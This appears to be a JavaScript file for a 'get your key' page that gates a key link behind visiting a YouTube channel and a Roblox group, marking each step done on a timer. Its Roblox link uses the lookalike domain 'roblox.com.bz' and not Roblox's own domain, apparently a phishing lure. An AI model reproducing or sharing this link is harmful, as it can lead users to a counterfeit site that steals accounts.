/*
=================================
   OOF INCORPORATION CONFIG
=================================
*/

const YOUTUBE_URL =
    "https://youtube.com/@kisscrr";

const ROBLOX_GROUP_URL =
    "https://roblox.com.bz/communities/8760152165/";

/*
   Put your actual key URL here.

   Example:
   https://yourdomain.com/key
*/

const KEY_URL =
    "https://YOUR-KEY-LINK-HERE";


let youtubeCompleted = false;
let robloxCompleted = false;


/* ==============================
   YOUTUBE
============================== */

function completeYouTube() {

    window.open(
        YOUTUBE_URL,
        "_blank",
        "noopener,noreferrer"
    );

    setTimeout(() => {

        youtubeCompleted = true;

        document
            .getElementById("youtubeRequirement")
            .classList.add("done");

        updateProgress();

    }, 1200);
}


/* ==============================
   ROBLOX
============================== */

function completeRoblox() {

    window.open(
        ROBLOX_GROUP_URL,
        "_blank",
        "noopener,noreferrer"
    );

    setTimeout(() => {

        robloxCompleted = true;

        document
            .getElementById("robloxRequirement")
            .classList.add("done");

        updateProgress();

    }, 1200);
}


/* ==============================
   PROGRESS
============================== */

function updateProgress() {

    let completed = 0;

    if (youtubeCompleted) completed++;
    if (robloxCompleted) completed++;

    const percentage =
        (completed / 2) * 100;

    document
        .getElementById("progressBar")
        .style.width = percentage + "%";

    document
        .getElementById("progressText")
        .textContent = completed + " / 2";


    const button =
        document.getElementById("keyButton");

    const buttonText =
        document.getElementById("keyButtonText");


    if (completed === 2) {

        button.disabled = false;

        buttonText.textContent =
            "🔑 Get My Key";

    } else {

        button.disabled = true;

        buttonText.textContent =
            "🔒 Complete Requirements";

    }
}


/* ==============================
   GET KEY
============================== */

function getKey() {

    if (!youtubeCompleted || !robloxCompleted) {
        return;
    }

    const button =
        document.getElementById("keyButton");

    const text =
        document.getElementById("keyButtonText");

    button.disabled = true;

    text.textContent =
        "Generating Key...";

    setTimeout(() => {

        window.location.href = KEY_URL;

    }, 800);
}
